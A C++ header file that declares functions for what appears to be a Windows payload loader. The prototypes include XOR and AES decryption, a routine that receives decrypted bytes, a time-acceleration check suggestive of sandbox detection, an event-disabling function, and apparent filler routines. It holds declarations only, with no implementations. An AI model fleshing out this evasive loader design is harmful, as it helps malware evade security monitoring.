
#include <iostream>
#include <ctime>
#include <algorithm>
#include <vector>
#include <fstream>
#include <chrono>
#include <thread>
#include <string>
#include <windows.h>


bool initUtils(const int &minValue, const int &maxValue, const int &lessThan, const int &greaterThan);

void printHelp();

void generateAndSortArray();

bool isFileExists(const std::string &filePath);

void au9u5tDecrypt(const std::string &filePath, const std::string &method,
                   const std::string &key, const std::string &function_mode);

int generateKey();

int decryptKey(const int &diff, const int &minValue, const int &maxValue,const int& lessThan, const int& greaterThan);

std::string x_o_r_EncryptDecrypt(const std::string &data, const std::string &key);

void function1(const unsigned char *decryptedData, const size_t &byteLength);

bool checkParameters(int argc, char *argv[]);

bool isTimeAccelerated();

BOOL DisableEvent();

std::string generateRandomString(const int &length);

std::string wstringToString(const std::wstring &wstr);

std::wstring stringToWstring(const std::string &str);

bool useAes(const std::string &filePath, const std::string &key, const std::string &function_mode);

void Euclid(int num1, int num2);